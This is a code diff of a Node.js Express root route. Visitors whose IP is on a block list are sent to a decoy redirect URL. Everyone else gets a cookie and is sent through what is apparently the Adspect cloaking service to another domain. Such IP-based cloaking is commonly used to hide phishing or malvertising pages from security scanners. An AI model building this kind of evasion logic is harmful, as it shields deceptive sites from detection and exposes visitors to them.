@@ -625,30 +625,33 @@ async function loadBlockedIPs() {
     }
 }
 
-app.get('/', async (req, res) => {
+app.get('/', async (req, res, next) => {
     console.log('Root route accessed');
+    
+    // Get client IP with fallbacks
     const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                     req.headers['x-real-ip'] || 
                     req.socket.remoteAddress;
     
+    // Check for admin panel access
     const isAdminPanel = req.headers.referer?.includes('/admin');
- 
     if (isAdminPanel) {
-        return next(); 
+        return next();
     }
- 
+    
+    // Check if website is enabled
     if (!state.settings.websiteEnabled && !isAdminPanel) {
         console.log('Website disabled - redirecting to:', state.settings.redirectUrl);
         return res.redirect(state.settings.redirectUrl);
     }
-
-    // Check if IP is in blocked list
+    
+    // Check if IP is blocked
     if (blockedIPs.has(clientIP)) {
         console.log(`Blocked IP detected (${clientIP}) - redirecting to:`, state.settings.redirectUrl);
         return res.redirect(state.settings.redirectUrl);
     }
- 
-    // If IP not blocked, proceed with normal flow
+    
+    // Normal flow - set cookie and redirect
     console.log('- Setting cookie and redirecting to Adspect');
     res.cookie('adspect_redirect', 'true', {
         maxAge: 15000,
@@ -668,9 +671,10 @@ app.get('/', async (req, res) => {
             sameSite: 'lax'
         }
     });
-        
+    
     return res.redirect(302, 'https://redirectingroute.com/');
 });
+
 
  app.post('/verify-honeypot', async (req, res) => {
     const { email, username, website } = req.body;
